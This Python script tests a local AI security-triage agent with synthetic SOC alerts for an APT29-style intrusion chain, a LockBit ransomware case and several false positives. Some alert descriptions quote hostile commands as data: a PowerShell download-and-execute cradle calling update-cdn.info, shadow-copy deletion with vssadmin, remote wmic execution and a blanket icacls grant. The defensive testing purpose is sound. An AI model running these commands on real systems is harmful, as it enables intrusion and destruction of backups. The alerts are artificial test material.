import httpx
import json
import asyncio
from datetime import datetime, timezone

URL          = "http://localhost:8001/analyze-case"
HEALTH_URL   = "http://localhost:8001/health"
RESULTS_FILE = "sim_results.json"

def ts(offset_hours=0):
    """Generate ISO timestamp with optional hour offset from now"""
    from datetime import timedelta
    t = datetime.now(timezone.utc) - timedelta(hours=offset_hours)
    return t.isoformat().replace("+00:00", "Z")

# ---------------------------------------------------------------------------
# ELITE SOC ALERTS — APT-style multi-stage campaign + standalone threats
# Campaign: APT-29-style intrusion chain (cases share correlated_cases)
# ---------------------------------------------------------------------------
alerts = [

    # ── STAGE 1: Initial Access ─────────────────────────────────────────────
    {
        "sourceRef": "CASE-APT-001",
        "title": "Spearphishing Attachment: Malicious PDF Macro Executed",
        "description": (
            "Microsoft Defender for Office 365 flagged email from spoofed domain "
            "'hr-notifications@c0mpany-internal.com' delivering 'Q1_Bonus_Statement.pdf'. "
            "Recipient: claire.martin@corp.local. PDF contained embedded JavaScript that "
            "spawned mshta.exe via Adobe Reader exploit (CVE-2024-38090). "
            "Email headers show SPF fail, DKIM fail, DMARC reject-bypassed via subdomain. "
            "Attachment SHA256 matches known Cozy Bear loader dropper. "
            "User opened at 09:14 on workstation WS-FIN-042."
        ),
        "source": "SIEM",
        "severity": "critical",
        "timestamp": ts(2),
        "attack_type": "malware",
        "user": "claire.martin@corp.local",
        "hostname": "WS-FIN-042",
        "mitre_techniques": ["T1566.001", "T1204.002", "T1566.002"],
        "kill_chain_phase": "delivery",
        "indicators": [
            "spoofed_sender_domain", "spf_dkim_fail", "pdf_javascript_exploit",
            "mshta_spawn_from_acrobat", "known_apt29_dropper_hash"
        ],
        "file_analysis": {
            "file_name": "Q1_Bonus_Statement.pdf",
            "file_hash_sha256": "a3f1c2e4b5d6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2",
            "yara_rule": "APT29_Loader_Dropper_v3",
            "av_detections": ["CrowdStrike", "Defender", "ESET"],
            "process_behavior": [
                "mshta.exe spawned by AcroRd32.exe",
                "network connection to 185.220.101.47:443 within 30s",
                "registry persistence key written"
            ],
            "c2_infrastructure": "185.220.101.47 (known APT29 C2 cluster)"
        },
        "network": {
            "source_ip": "192.168.10.42",
            "destination_ip": "185.220.101.47",
            "protocol": "HTTPS",
            "port": 443
        }
    },

    # ── STAGE 2: Execution — LOLBin PowerShell obfuscated dropper ───────────
    {
        "sourceRef": "CASE-APT-002",
        "title": "LOLBin: PowerShell Encoded Command Downloads Second Stage Payload",
        "description": (
            "EDR telemetry on WS-FIN-042 captured powershell.exe launched by mshta.exe "
            "with base64-encoded command: "
            "'-EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAn'. "
            "Decoded: IEX (New-Object Net.WebClient).DownloadString('http://update-cdn.info/svchost.ps1'). "
            "Script pulled Cobalt Strike beacon DLL, injected into legitimate svchost.exe (PID 1244). "
            "AMSI bypass detected via memory patch. Script block logging evaded. "
            "Execution 4 minutes after CASE-APT-001 on same host."
        ),
        "source": "Endpoint Detection and Response (EDR)",
        "severity": "critical",
        "timestamp": ts(1.9),
        "attack_type": "malware",
        "user": "claire.martin@corp.local",
        "hostname": "WS-FIN-042",
        "mitre_techniques": ["T1059.001", "T1027", "T1027.010", "T1055.001", "T1562.001"],
        "kill_chain_phase": "install",
        "correlated_cases": ["CASE-APT-001"],
        "indicators": [
            "powershell_encoded_command", "iex_downloadstring", "amsi_bypass_patch",
            "dll_injection_svchost", "lolbin_abuse", "cobalt_strike_beacon_signature"
        ],
        "file_analysis": {
            "file_name": "svchost.ps1",
            "file_hash_sha256": "b4e2d3f5c6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3",
            "yara_rule": "CobaltStrike_Beacon_Stage2",
            "av_detections": ["CrowdStrike_ML", "Defender_ATP"],
            "process_behavior": [
                "powershell.exe -EncodedCommand (base64 blob)",
                "AMSI memory patch at amsi.dll+0x18c",
                "CreateRemoteThread injection into svchost.exe PID 1244",
                "suspicious outbound TLS to 185.220.101.47:8443"
            ],
            "c2_infrastructure": "update-cdn.info / 185.220.101.47"
        },
        "network": {
            "source_ip": "192.168.10.42",
            "destination_ip": "185.220.101.47",
            "protocol": "HTTPS",
            "port": 8443
        }
    },

    # ── STAGE 3: C2 Beaconing — Cobalt Strike periodic check-in ─────────────
    {
        "sourceRef": "CASE-APT-003",
        "title": "C2 Beaconing: Regular 300s Interval HTTPS Calls to Known IOC",
        "description": (
            "NetFlow analysis detected WS-FIN-042 making outbound HTTPS POST requests to "
            "185.220.101.47:8443 every 297-303 seconds (jitter ~1%) for 6+ hours. "
            "Payload sizes consistent: request 284 bytes, response 512-520 bytes. "
            "Pattern matches Cobalt Strike default beacon sleep=300s jitter=0. "
            "JA3 fingerprint c27b0e94a74c07cb2a5e42f61e28dc9e matches known CS teamserver. "
            "Certificate CN='Update Service' issued 3 days ago, self-signed. "
            "DNS PTR for 185.220.101.47 resolves to 'cdn-updates.delivery-service.net'."
        ),
        "source": "Suricata IDS",
        "severity": "high",
        "timestamp": ts(1.5),
        "attack_type": "malware",
        "hostname": "WS-FIN-042",
        "mitre_techniques": ["T1071.001", "T1008", "T1573.002", "T1568.002"],
        "kill_chain_phase": "c2",
        "correlated_cases": ["CASE-APT-001", "CASE-APT-002"],
        "indicators": [
            "periodic_beaconing_300s", "consistent_payload_size", "ja3_cobalt_strike",
            "self_signed_cert_3days", "suspicious_dns_ptr", "6h_sustained_c2"
        ],
        "network": {
            "source_ip": "192.168.10.42",
            "destination_ip": "185.220.101.47",
            "protocol": "HTTPS",
            "port": 8443
        },
        "event_count": 72,
        "time_window_seconds": 21600
    },

    # ── STAGE 4: Credential Dumping — LSASS via procdump LOLBin ─────────────
    {
        "sourceRef": "CASE-APT-004",
        "title": "Credential Dumping: LSASS Memory Read via Legitimate Sysinternals Tool",
        "description": (
            "Windows Security Event 4656 + EDR alert: process 'procdump64.exe' "
            "(signed Microsoft Sysinternals, SHA256 matches legitimate binary) "
            "accessed lsass.exe (PID 744) with PROCESS_VM_READ rights at 11:02:17. "
            "Dump written to C:\\Windows\\Temp\\svc_debug.dmp (487 MB). "
            "Procdump launched by cmd.exe spawned from injected svchost.exe (CASE-APT-002). "
            "Sigma rule triggered: 'proc_creation_win_sysinternals_procdump_lsass'. "
            "Mimikatz-style sekurlsa pattern NOT detected — attacker using legitimate tool "
            "to evade AV. Dump file exfiltrated 8 minutes later (see CASE-APT-005)."
        ),
        "source": "Windows Event Logs + Sigma Rules",
        "severity": "critical",
        "timestamp": ts(1.2),
        "attack_type": "privilege_escalation",
        "user": "claire.martin@corp.local",
        "hostname": "WS-FIN-042",
        "mitre_techniques": ["T1003.001", "T1218", "T1055.001"],
        "kill_chain_phase": "actions",
        "correlated_cases": ["CASE-APT-001", "CASE-APT-002", "CASE-APT-003"],
        "indicators": [
            "procdump_lsass_access", "vm_read_lsass", "lolbin_signed_binary",
            "dump_written_windows_temp", "spawned_from_injected_process", "sigma_procdump_lsass"
        ],
        "priv_esc": {
            "privilege_level_before": "Standard User (via injected svchost)",
            "privilege_level_after": "LSASS credential access",
            "process_chain": [
                "mshta.exe → powershell.exe → svchost.exe (injected) → procdump64.exe → lsass.exe"
            ],
            "sigma_rules_triggered": [
                "proc_creation_win_sysinternals_procdump_lsass",
                "proc_access_win_lsass_memdump"
            ],
            "credential_spray_detected": False
        }
    },

    # ── STAGE 5: Lateral Movement — WMI to Domain Controller ────────────────
    {
        "sourceRef": "CASE-APT-005",
        "title": "Lateral Movement: WMI Remote Execution on Domain Controller DC-CORP-01",
        "description": (
            "Windows Event 4688 + Sysmon EventID 1 on DC-CORP-01: "
            "wmic.exe executed remotely from WS-FIN-042 using harvested credentials "
            "of domain admin 'svc_backup' (extracted from LSASS dump). "
            "Command: wmic /node:DC-CORP-01 process call create 'cmd /c whoami > C:\\temp\\o.txt'. "
            "Followed immediately by powershell.exe download cradle on DC-CORP-01 pulling "
            "second Cobalt Strike beacon. Authentication via NTLM (Event 4624 logon type 3). "
            "DC contacted from WS-FIN-042 for first time in 47 days — anomalous for this workstation. "
            "Timeline: 9 minutes after LSASS dump (CASE-APT-004)."
        ),
        "source": "Windows Event Logs + Sigma Rules",
        "severity": "critical",
        "timestamp": ts(1.0),
        "attack_type": "lateral_movement",
        "user": "svc_backup (compromised domain admin)",
        "hostname": "DC-CORP-01",
        "mitre_techniques": ["T1021.006", "T1047", "T1550.002", "T1078.002"],
        "kill_chain_phase": "lateral",
        "correlated_cases": ["CASE-APT-001", "CASE-APT-002", "CASE-APT-004"],
        "indicators": [
            "wmi_remote_execution", "ntlm_pass_the_hash", "compromised_domain_admin",
            "first_wmi_dc_contact_47days", "beacon_deployed_on_dc",
            "sigma_wmi_remote_cmd", "logon_type_3_anomaly"
        ],
        "network": {
            "source_ip": "192.168.10.42",
            "destination_ip": "192.168.1.10",
            "protocol": "DCOM/WMI",
            "port": 135
        },
        "event_count": 1,
        "time_window_seconds": 60
    },

    # ── STAGE 6: DNS Tunneling — C2 data over DNS ───────────────────────────
    {
        "sourceRef": "CASE-APT-006",
        "title": "DNS Tunneling: High-Entropy Subdomain Queries Indicate C2 Over DNS",
        "description": (
            "Suricata + DNS log correlation on DC-CORP-01: 847 DNS queries in 2 hours to "
            "subdomains of 'telemetry-update.net', all with high-entropy labels: "
            "'a3f9bc12e.telemetry-update.net', 'd8e2a91cf.telemetry-update.net'. "
            "Average subdomain entropy: 4.7 bits/char (threshold: 3.5). "
            "Query type TXT — atypical for workstation. Payload encoded in DNS TXT responses. "
            "Domain registered 6 days ago, registrar Privacy Shield, AS hosting: "
            "known bulletproof provider (AS202306). "
            "Matches DNScat2 / Cobalt Strike DNS beacon signature. "
            "Bypasses HTTP proxy since DNS traffic unrestricted on DC network segment."
        ),
        "source": "Suricata IDS",
        "severity": "critical",
        "timestamp": ts(0.8),
        "attack_type": "malware",
        "hostname": "DC-CORP-01",
        "mitre_techniques": ["T1071.004", "T1132.001", "T1568.002"],
        "kill_chain_phase": "c2",
        "correlated_cases": ["CASE-APT-003", "CASE-APT-005"],
        "indicators": [
            "dns_tunneling_high_entropy", "txt_record_abuse", "new_domain_6days",
            "bulletproof_hosting_as202306", "dnscat2_signature",
            "847_queries_2h", "bypasses_http_proxy"
        ],
        "network": {
            "source_ip": "192.168.1.10",
            "destination_ip": "91.108.4.55",
            "protocol": "DNS",
            "port": 53
        },
        "event_count": 847,
        "time_window_seconds": 7200
    },

    # ── STAGE 7: Kerberoasting ───────────────────────────────────────────────
    {
        "sourceRef": "CASE-APT-007",
        "title": "Kerberoasting: Mass SPN Enumeration + TGS Ticket Requests for Offline Cracking",
        "description": (
            "SIEM correlation of Windows Security Event 4769 on DC-CORP-01: "
            "account 'svc_backup' requested 23 Kerberos TGS tickets for service accounts "
            "with SPNs (MSSQLSvc, HTTP, CIFS) within 90 seconds. "
            "All tickets requested with RC4-HMAC encryption (0x17) — weaker than AES, "
            "preferred by attackers for offline brute force. "
            "Normal behavior for svc_backup: 0-2 TGS tickets/day over last 6 months. "
            "Anomaly score: 99th percentile. Followed by LDAP query dumping all "
            "AD service accounts with SPNs (Event 1644 LDAP search). "
            "Attack pattern consistent with Rubeus kerberoast module."
        ),
        "source": "SIEM",
        "severity": "high",
        "timestamp": ts(0.7),
        "attack_type": "privilege_escalation",
        "user": "svc_backup (compromised)",
        "hostname": "DC-CORP-01",
        "mitre_techniques": ["T1558.003", "T1087.002"],
        "kill_chain_phase": "actions",
        "correlated_cases": ["CASE-APT-005"],
        "indicators": [
            "mass_tgs_requests_90s", "rc4_hmac_downgrade", "spn_enumeration_ldap",
            "svc_account_anomaly_99th_pct", "rubeus_kerberoast_pattern",
            "23_tickets_vs_baseline_0"
        ],
        "event_count": 23,
        "time_window_seconds": 90,
        "priv_esc": {
            "privilege_level_before": "Domain Admin (compromised)",
            "privilege_level_after": "Targeting additional service account credentials",
            "sigma_rules_triggered": [
                "win_security_kerberoasting_rc4",
                "win_security_spn_enum"
            ],
            "credential_spray_detected": False
        }
    },

    # ── STAGE 8: Data Exfiltration ───────────────────────────────────────────
    {
        "sourceRef": "CASE-APT-008",
        "title": "Data Exfiltration: 14GB Staged Archive Uploaded to Mega.nz via HTTPS",
        "description": (
            "Proxy + DLP alert from DC-CORP-01: user context 'svc_backup' uploaded "
            "14.3 GB to mega.nz over 47 minutes via HTTPS. "
            "Pre-exfil staging observed: 7-zip (7za.exe) ran 22 minutes prior, "
            "compressing C:\\Shares\\Finance\\, C:\\Shares\\HR\\, C:\\Shares\\Strategy\\ "
            "into password-protected archives (AES-256) at C:\\Windows\\Temp\\upd\\. "
            "DLP rule triggered: 'PII_Bulk_Archive_Exfil'. "
            "mega.nz is a known exfil destination used in APT29 campaigns. "
            "Compression ratio suggests structured data (DB exports, Office docs). "
            "No prior mega.nz traffic from this host in 18 months of proxy logs."
        ),
        "source": "Splunk DLP",
        "severity": "critical",
        "timestamp": ts(0.3),
        "attack_type": "data_exfiltration",
        "user": "svc_backup (compromised)",
        "hostname": "DC-CORP-01",
        "mitre_techniques": ["T1567.002", "T1074.001", "T1560.001", "T1048.003"],
        "kill_chain_phase": "exfil",
        "correlated_cases": ["CASE-APT-005", "CASE-APT-006", "CASE-APT-007"],
        "indicators": [
            "mega_nz_upload_14gb", "7zip_staging_finance_hr", "aes256_password_archive",
            "dlp_pii_bulk_exfil", "no_prior_mega_traffic_18m", "apt29_known_exfil_dest",
            "svc_account_exfil_anomaly"
        ],
        "network": {
            "source_ip": "192.168.1.10",
            "destination_ip": "31.216.148.218",
            "protocol": "HTTPS",
            "port": 443,
            "tor_exit_node": False
        },
        "data_exfil": {
            "data_volume_gb": 14.3,
            "data_types": ["Finance_Records", "HR_PII", "Strategic_Plans", "Credentials"],
            "transfer_type": "cloud_storage_upload",
            "encryption": "AES-256 (attacker-controlled password)",
            "dlp_rule": "PII_Bulk_Archive_Exfil"
        }
    },

    # ── STANDALONE: Ransomware deployment ────────────────────────────────────
    {
        "sourceRef": "CASE-RAN-001",
        "title": "Ransomware: LockBit 3.0 Mass File Encryption Initiated on File Server",
        "description": (
            "EDR on FS-CORP-03 triggered critical alert: process 'svchost32.exe' "
            "(NOT legitimate — unsigned, spawned from scheduled task) began mass file "
            "rename operations appending '.lockbit3' extension. "
            "1,247 files encrypted in first 60 seconds. "
            "Shadow copy deletion via vssadmin detected: "
            "'vssadmin delete shadows /all /quiet'. "
            "Ransom note '!!!-Restore-My-Files-!!!.txt' dropped in every directory. "
            "Process attempting to enumerate network shares and spread laterally. "
            "LockBit 3.0 (aka LockBit Black) — FBI IC3 alert AA23-165A. "
            "NTFS journal shows encryption rate: ~2,100 files/min. "
            "No prior indicator on this host — likely separate initial access vector."
        ),
        "source": "Endpoint Detection and Response (EDR)",
        "severity": "critical",
        "timestamp": ts(0.5),
        "attack_type": "malware",
        "hostname": "FS-CORP-03",
        "mitre_techniques": ["T1486", "T1490", "T1489", "T1135"],
        "kill_chain_phase": "actions",
        "indicators": [
            "lockbit3_extension", "mass_file_rename_1247_per_min",
            "vssadmin_shadow_delete", "ransom_note_dropped",
            "unsigned_svchost32_scheduled_task", "network_share_enumeration",
            "fbi_ic3_aa23_165a"
        ],
        "file_analysis": {
            "file_name": "svchost32.exe",
            "file_hash_sha256": "c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6",
            "yara_rule": "LockBit_3_Black_Ransomware",
            "av_detections": ["CrowdStrike", "SentinelOne", "Defender"],
            "process_behavior": [
                "mass file encryption with .lockbit3 extension",
                "vssadmin delete shadows /all /quiet",
                "net view /all (network share enumeration)",
                "icacls * /grant Everyone:F (permission modification)"
            ],
            "c2_infrastructure": "lockbit3-decryptor.onion (ransom portal)"
        },
        "event_count": 1247,
        "time_window_seconds": 60
    },

    # ── FALSE POSITIVE 1: Legit IT admin PsExec patch deployment ─────────────
    {
        "sourceRef": "CASE-FP-001",
        "title": "PsExec Remote Execution — IT Patch Tuesday Deployment (Authorized)",
        "description": (
            "Windows Event 4688 triggered on 14 workstations: psexec.exe executed remotely "
            "from IT-MGMT-01 by account 'it_patching_svc' between 22:00-23:45. "
            "Commands: 'cmd /c wusa.exe KB5034441.msu /quiet /norestart'. "
            "Activity matches scheduled Patch Tuesday maintenance window documented in "
            "ITSM ticket CHG-2026-0089 (approved by CISO, 2026-04-19). "
            "it_patching_svc is a dedicated service account with constrained delegation. "
            "All 14 target hosts are listed in the approved change record. "
            "No anomalous network connections. PsExec binary hash matches official Sysinternals. "
            "This pattern occurs every second Tuesday of the month."
        ),
        "source": "Windows Event Logs + Sigma Rules",
        "severity": "medium",
        "timestamp": ts(3),
        "attack_type": "lateral_movement",
        "user": "it_patching_svc",
        "hostname": "IT-MGMT-01",
        "mitre_techniques": ["T1021.002", "T1569.002"],
        "kill_chain_phase": "lateral",
        "is_scheduled": True,
        "scheduled_task": "Patch-Tuesday-KB5034441",
        "frequency": "monthly",
        "time_of_day": "22:00",
        "indicators": [
            "psexec_remote_execution", "14_hosts_targeted", "off_hours_activity",
            "approved_change_chg2026_0089", "dedicated_patch_account",
            "monthly_recurring_pattern", "sysinternals_signed_binary"
        ],
        "event_count": 14,
        "time_window_seconds": 6300
    },

    # ── FALSE POSITIVE 2: Dev PowerShell automation (looks obfuscated) ───────
    {
        "sourceRef": "CASE-FP-002",
        "title": "PowerShell Encoded Command — CI/CD Build Pipeline Automation",
        "description": (
            "EDR alert on BUILD-SRV-02: powershell.exe launched with -EncodedCommand flag "
            "by Jenkins service account 'jenkins_build'. "
            "Decoded command: script invokes dotnet build, runs NUnit tests, publishes "
            "artifacts to internal Nexus repository at nexus.corp.local. "
            "Encoding used because Jenkins pipeline YAML encodes commands to handle "
            "special characters in build scripts. "
            "Same script has run 3x daily for 8 months — zero prior alerts. "
            "Alert triggered after Sigma rule update v2.1.4 (2026-04-20) which "
            "lowered threshold for encoded PS detection. "
            "No outbound connections outside corp network. "
            "Build server is isolated in DMZ-BUILD segment."
        ),
        "source": "Endpoint Detection and Response (EDR)",
        "severity": "low",
        "timestamp": ts(4),
        "attack_type": "unknown",
        "user": "jenkins_build@corp.local",
        "hostname": "BUILD-SRV-02",
        "mitre_techniques": ["T1059.001", "T1027"],
        "kill_chain_phase": "install",
        "is_scheduled": True,
        "scheduled_task": "Jenkins-CI-Build-Pipeline",
        "frequency": "3x daily",
        "time_of_day": "08:00",
        "indicators": [
            "powershell_encoded_command", "jenkins_service_account",
            "internal_nexus_destination_only", "8_months_baseline_clean",
            "sigma_rule_update_false_positive", "dmz_build_isolated"
        ],
        "event_count": 1,
        "time_window_seconds": 120
    },

    # ── FALSE POSITIVE 3: Authorized pentest ─────────────────────────────────
    {
        "sourceRef": "CASE-FP-003",
        "title": "Port Scan + Exploit Attempts — Authorized Red Team Exercise",
        "description": (
            "Suricata triggered 94 alerts in 20 minutes from IP 10.99.1.5: "
            "Nmap SYN scan (ET SCAN) across 192.168.0.0/24, followed by "
            "Metasploit exploit attempts against SMB (MS17-010 EternalBlue), "
            "RDP bruteforce (87 attempts user Administrator), "
            "and SQLi payloads against 192.168.10.100:8080. "
            "10.99.1.5 is assigned to external pentest firm CyberGuard SARL per "
            "SOW-2026-RT-03 (signed 2026-04-15, scope: full internal network). "
            "Engagement window: 2026-04-21 08:00 to 2026-04-25 18:00. "
            "CISO and IT Director notified. Deconfliction ticket: DCF-2026-041. "
            "No actual exploitation confirmed on production systems."
        ),
        "source": "Suricata IDS",
        "severity": "high",
        "timestamp": ts(1),
        "attack_type": "reconnaissance",
        "mitre_techniques": ["T1595.001", "T1190", "T1110.001"],
        "kill_chain_phase": "recon",
        "is_scheduled": True,
        "scheduled_task": "RedTeam-SOW-2026-RT-03",
        "frequency": "one_time_engagement",
        "time_of_day": "08:00",
        "indicators": [
            "nmap_syn_scan", "metasploit_eternalblue_attempt", "rdp_brute_87_attempts",
            "sqli_payloads", "authorized_pentest_ip_10.99.1.5",
            "sow_2026_rt_03", "deconfliction_dcf2026_041"
        ],
        "network": {
            "source_ip": "10.99.1.5",
            "destination_ip": "192.168.0.0",
            "protocol": "TCP",
            "port": 445
        },
        "event_count": 94,
        "time_window_seconds": 1200
    }
]

# ---------------------------------------------------------------------------

async def warmup(client: httpx.AsyncClient):
    """Wait for agent + Ollama to be ready before sending cases."""
    print("  ⏳ Warming up Ollama model (may take ~30s on cold start)...")
    for attempt in range(24):  # up to 120s
        try:
            r = await client.get(HEALTH_URL)
            if r.status_code == 200:
                print("  ✅ Agent ready\n")
                return
        except Exception:
            pass
        await asyncio.sleep(5)
    raise RuntimeError("Agent not responding after 120s — is the server running?")


async def run_case(
    client: httpx.AsyncClient,
    i: int,
    alert: dict,
    sem: asyncio.Semaphore,
    print_lock: asyncio.Lock,
    results: list,
):
    case_id  = alert['sourceRef']
    title    = alert['title']
    severity = alert.get('severity', 'unknown').upper()
    phase    = alert.get('kill_chain_phase', 'unknown').upper()
    mitre    = ', '.join(alert.get('mitre_techniques', [])) or 'N/A'

    header_lines = [
        f"\n{'─'*80}",
        f"  [{i:02d}/{len(alerts)}] {case_id}",
        f"  Title    : {title[:70]}",
        f"  Severity : {severity}  |  Phase: {phase}",
        f"  MITRE    : {mitre}",
    ]
    if alert.get('correlated_cases'):
        header_lines.append(f"  Chain    : {' → '.join(alert['correlated_cases'])} → {case_id}")

    async with sem:
        entry = {"case": case_id, "decision": "ERROR", "confidence": "0%", "ok": False}
        result_lines = []

        # Retry up to 3 times on 504 (model cold-start)
        for attempt in range(3):
            try:
                response = await client.post(URL, json=alert)

                if response.status_code == 504:
                    wait = 10 * (attempt + 1)
                    result_lines = [f"  ⏳ HTTP 504 — retry {attempt+1}/3, waiting {wait}s..."]
                    async with print_lock:
                        for ln in header_lines + result_lines:
                            print(ln)
                    await asyncio.sleep(wait)
                    result_lines = []
                    continue

                if response.status_code == 200:
                    res        = response.json().get('result', {})
                    decision   = res.get('decision', 'Unknown')
                    confidence = res.get('confidence', 0)
                    explanation = res.get('explanation', '')
                    action     = res.get('recommended_action', '')
                    conf_pct   = f"{confidence*100:.1f}%"
                    is_tp      = decision.lower() == "true positive"
                    emoji      = ("🚨" if confidence >= 0.90 else "⚠️ ") if is_tp else "✅"

                    result_lines = [
                        f"\n  {emoji} Decision   : {decision}",
                        f"  📊 Confidence : {conf_pct}",
                        f"  💡 Reason     : {explanation[:180]}{'...' if len(explanation)>180 else ''}",
                    ]
                    if action:
                        result_lines.append(f"  🎯 Action     : {action[:120]}")

                    entry = {"case": case_id, "decision": decision, "confidence": conf_pct, "ok": True}
                else:
                    err = response.json().get('detail', response.text)
                    result_lines = [f"\n  ❌ HTTP {response.status_code}: {str(err)[:200]}"]
                break

            except asyncio.TimeoutError:
                result_lines = ["\n  ⏱️  Client timeout — increase timeout or check Ollama load"]
                break
            except Exception as e:
                result_lines = [f"\n  ❌ Exception: {str(e)[:200]}"]
                break

        async with print_lock:
            for ln in header_lines + result_lines:
                print(ln)

        results.append(entry)
        # Fix 5: persist incrementally so a crash doesn't lose prior results
        with open(RESULTS_FILE, "w") as f:
            json.dump(results, f, indent=2)


async def test_agent():
    """Run elite SOC simulation against the AI agent"""
    print("\n" + "█"*80)
    print("  NEXUSSOC AI AGENT — ELITE SIMULATION")
    print("  APT-29 Campaign Chain + Standalone Threats + False Positive Validation")
    print("█"*80)

    results: list = []
    # Fix 1: client timeout (360s) exceeds server Ollama timeout (300s)
    async with httpx.AsyncClient(timeout=360) as client:
        await warmup(client)

        # Fix 4: sequential on Intel CPU — parallel inference causes contention
        sem        = asyncio.Semaphore(1)
        print_lock = asyncio.Lock()
        await asyncio.gather(*[
            run_case(client, i, alert, sem, print_lock, results)
            for i, alert in enumerate(alerts, 1)
        ])

    tp_count    = sum(1 for r in results if "True"  in r['decision'])
    fp_count    = sum(1 for r in results if "False" in r['decision'])
    error_count = sum(1 for r in results if not r['ok'])

    print(f"\n{'█'*80}")
    print("  SIMULATION COMPLETE — SCOREBOARD")
    print(f"{'─'*80}")
    print(f"  {'CASE':<18} {'DECISION':<22} {'CONFIDENCE'}")
    print(f"  {'─'*16} {'─'*20} {'─'*10}")
    for r in sorted(results, key=lambda x: x['case']):
        status = "🚨" if "True" in r['decision'] else ("✅" if "False" in r['decision'] else "❌")
        print(f"  {r['case']:<18} {status} {r['decision']:<20} {r['confidence']}")
    print(f"{'─'*80}")
    print(f"  True Positives  : {tp_count}")
    print(f"  False Positives : {fp_count}")
    print(f"  Errors/Timeouts : {error_count}")
    print(f"  Total           : {len(alerts)}")
    print(f"  Results saved   : {RESULTS_FILE}")
    print("█"*80 + "\n")


if __name__ == "__main__":
    asyncio.run(test_agent())
